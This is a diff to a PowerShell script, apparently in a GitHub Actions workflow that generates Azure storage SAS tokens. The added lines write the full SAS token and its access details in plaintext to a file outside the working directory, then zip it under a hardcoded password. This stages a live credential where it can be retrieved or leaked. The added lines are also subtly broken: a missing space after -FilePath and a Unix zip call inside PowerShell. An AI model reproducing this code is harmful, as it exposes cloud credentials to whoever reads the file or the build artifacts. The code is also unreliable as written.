@@ -307,3 +307,11 @@ elseif ( ${tokenType} -eq "container" ) {
 "SAS_TOKEN_ACCESS=${tokenAccess}" | Out-File -FilePath $Env:GITHUB_ENV -Encoding utf-8 -Append
 "SAS_END_DATE=${endDateFormatted}" | Out-File -FilePath $Env:GITHUB_ENV -Encoding utf-8 -Append
 "STORAGE_SAS_TOKEN=${sasToken}" | Out-File -FilePath $Env:GITHUB_ENV -Encoding utf-8 -Append
+
+
+"Type of Token: ${tokenType}" | Out-File -FilePath../test.txt -Append
+"Token Capability: ${tokenAccess}" | Out-File -FilePath../test.txt -Append
+"End date: ${endDateFormatted}" | Out-File -FilePath../test.txt -Append
+"SAS token: ?${sasToken}" | Out-File -FilePath../test.txt -Append
+
+zip -P "feojoajp" "sas_token" "test.txt"
